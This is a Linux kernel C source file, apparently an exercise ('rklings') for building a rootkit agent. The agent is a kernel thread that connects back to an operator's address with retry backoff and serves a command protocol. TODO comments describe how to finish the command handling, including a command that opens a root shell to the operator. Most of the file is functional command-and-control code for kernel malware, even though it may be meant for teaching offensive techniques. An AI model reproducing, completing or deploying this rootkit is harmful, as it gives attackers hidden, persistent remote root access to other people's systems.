// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/jiffies.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/uio.h>
#include <net/net_namespace.h>

#include "agent.h"
#include "root_shell.h"

static ssize_t rk_socket_send(struct socket *socket,
			      const unsigned char *bytes, size_t length,
			      void *context)
{
	struct msghdr message = { };
	struct kvec vector = {
		.iov_base = (void *)bytes,
		.iov_len = length,
	};

	(void)context;
	return kernel_sendmsg(socket, &message, &vector, 1, length);
}

static ssize_t rk_socket_receive(struct socket *socket, unsigned char *bytes,
				 size_t length, void *context)
{
	struct msghdr message = { };
	struct kvec vector = {
		.iov_base = bytes,
		.iov_len = length,
	};

	(void)context;
	return kernel_recvmsg(socket, &message, &vector, 1, length, 0);
}

static const struct rk_transport_ops rk_transport = {
	.send = rk_socket_send,
	.receive = rk_socket_receive,
};

static void rk_count_protocol_error(struct rk_agent *agent)
{
	mutex_lock(&agent->lock);
	agent->protocol_errors++;
	mutex_unlock(&agent->lock);
}

static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
			    const struct rk_frame *frame, bool *close_session)
{
	static const unsigned char error_reply[] = "ERR";
	unsigned char reply[RK_FRAME_MAX];
	struct rk_command command;
	size_t reply_length;
	int error;

	*close_session = false;
	error = rk_command_parse(frame->payload, frame->length, &command);
	mutex_lock(&agent->lock);
	agent->commands++;
	if (error)
		agent->protocol_errors++;
	mutex_unlock(&agent->lock);
	if (error)
		return rk_send_frame(&rk_transport, NULL, socket, error_reply,
				     sizeof(error_reply) - 1);

	// TODO: Handle each command.kind with a switch statement.
	//
	// RK_COMMAND_INFO: reply "INFO rklings"
	// RK_COMMAND_STATUS: reply "STATUS connected=true/false attempts=N"
	//   (read connected and connections under agent->lock)
	// RK_COMMAND_SHELL: call rk_root_shell_request() with the operator's
	//   address (agent->peer.sin_addr.s_addr) and command.shell_port.
	//   On success, reply "OPEN %08x %016llx" with request_id and cookie.
	//   On -EBUSY, reply "ERR 4". Otherwise reply "ERR 5".
	// RK_COMMAND_SHELL_STATUS: call rk_root_shell_snapshot(), reply
	//   "STATE %08x %s %d" with request_id, state name, and result.
	// RK_COMMAND_QUIT: set *close_session = true, return 0.
	//
	// Use rk_send_frame(&rk_transport, NULL, socket, ...) to send.
	// Use scnprintf(reply, sizeof(reply), ...) to format.

	(void)reply;
	(void)reply_length;
	return -EPROTO;
}

static int rk_agent_serve(struct rk_agent *agent, struct socket *socket)
{
	for (;;) {
		struct rk_frame frame;
		bool close_session;
		int error;

		if (kthread_should_stop())
			return 0;
		error = rk_receive_frame(&rk_transport, NULL, socket, &frame);
		if (error == -EMSGSIZE) {
			static const unsigned char reply[] = "ERR";

			rk_count_protocol_error(agent);
			error = rk_send_frame(&rk_transport, NULL, socket,
					      reply, sizeof(reply) - 1);
			if (!error)
				continue;
		}
		if (error)
			return error;
		error = rk_agent_command(agent, socket, &frame, &close_session);
		if (error || close_session)
			return error;
	}
}

static int rk_agent_attempt(struct rk_agent *agent)
{
	struct socket *socket = NULL;
	bool connected = false;
	bool shutdown_here = false;
	int error;

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
				 &socket);
	if (error)
		return error;
	if (!socket)
		return -EPROTO;

	mutex_lock(&agent->lock);
	if (agent->stopping) {
		mutex_unlock(&agent->lock);
		sock_release(socket);
		return 0;
	}
	agent->active = socket;
	agent->shutdown_started = false;
	mutex_unlock(&agent->lock);

	error = kernel_connect(socket,
			       (struct sockaddr_unsized *)&agent->peer,
			       sizeof(agent->peer), 0);
	if (error)
		goto close;
	connected = true;
	mutex_lock(&agent->lock);
	agent->connected = true;
	agent->connections++;
	agent->retry_delay_ms = agent->retry_base_ms;
	mutex_unlock(&agent->lock);
	error = rk_agent_serve(agent, socket);

close:
	mutex_lock(&agent->lock);
	if (agent->active == socket)
		agent->active = NULL;
	agent->connected = false;
	if (connected && !agent->shutdown_started) {
		agent->shutdown_started = true;
		shutdown_here = true;
	}
	mutex_unlock(&agent->lock);
	if (shutdown_here)
		(void)kernel_sock_shutdown(socket, SHUT_RDWR);
	sock_release(socket);
	return error;
}

static int rk_agent_worker(void *argument)
{
	struct rk_agent *agent = argument;

	while (!kthread_should_stop()) {
		unsigned int delay;
		long waited;
		int error;

		mutex_lock(&agent->lock);
		agent->attempts++;
		mutex_unlock(&agent->lock);
		error = rk_agent_attempt(agent);
		if (kthread_should_stop())
			break;
		mutex_lock(&agent->lock);
		if (error)
			agent->transport_errors++;
		delay = agent->retry_delay_ms;
		agent->retries++;
		if (error)
			agent->retry_delay_ms = rk_retry_next(
				agent->retry_delay_ms, agent->retry_base_ms,
				agent->retry_max_ms);
		else
			agent->retry_delay_ms = agent->retry_base_ms;
		mutex_unlock(&agent->lock);
		// TODO: Add jitter to the delay before sleeping.
		// Add a random value up to 25% of the current delay.
		// Use get_random_u32_below(delay / 4 + 1) to avoid
		// get_random_u32_below(0) when delay < 4.
		waited = wait_event_interruptible_timeout(
			agent->retry_wait, kthread_should_stop(),
			msecs_to_jiffies(delay));
		(void)waited;
	}
	return 0;
}

int rk_agent_start(struct rk_agent *agent, __be32 peer_address, u16 peer_port,
		   unsigned int retry_base_ms, unsigned int retry_max_ms,
		   struct rk_root_shell *shell)
{
	struct task_struct *task;

	if (!agent || !peer_address || !peer_port || !retry_base_ms ||
	    retry_base_ms > retry_max_ms || retry_max_ms > 5000 || !shell)
		return -EINVAL;
	memset(agent, 0, sizeof(*agent));
	mutex_init(&agent->lock);
	init_waitqueue_head(&agent->retry_wait);
	agent->peer.sin_family = AF_INET;
	agent->peer.sin_addr.s_addr = peer_address;
	agent->peer.sin_port = htons(peer_port);
	agent->retry_base_ms = retry_base_ms;
	agent->retry_max_ms = retry_max_ms;
	agent->retry_delay_ms = retry_base_ms;
	agent->shell = shell;
	agent->initialized = true;
	task = kthread_create(rk_agent_worker, agent, "rkling_agent");
	if (IS_ERR(task)) {
		agent->initialized = false;
		return PTR_ERR(task);
	}
	mutex_lock(&agent->lock);
	agent->task = task;
	mutex_unlock(&agent->lock);
	wake_up_process(task);
	return 0;
}

void rk_agent_stop(struct rk_agent *agent)
{
	struct task_struct *task;

	if (!agent || !READ_ONCE(agent->initialized))
		return;
	mutex_lock(&agent->lock);
	task = agent->task;
	if (!task) {
		mutex_unlock(&agent->lock);
		return;
	}
	agent->stopping = true;
	if (agent->active && !agent->shutdown_started) {
		agent->shutdown_started = true;
		(void)kernel_sock_shutdown(agent->active, SHUT_RDWR);
	}
	mutex_unlock(&agent->lock);
	wake_up_interruptible(&agent->retry_wait);
	(void)kthread_stop(task);
	mutex_lock(&agent->lock);
	agent->task = NULL;
	agent->connected = false;
	mutex_unlock(&agent->lock);
}
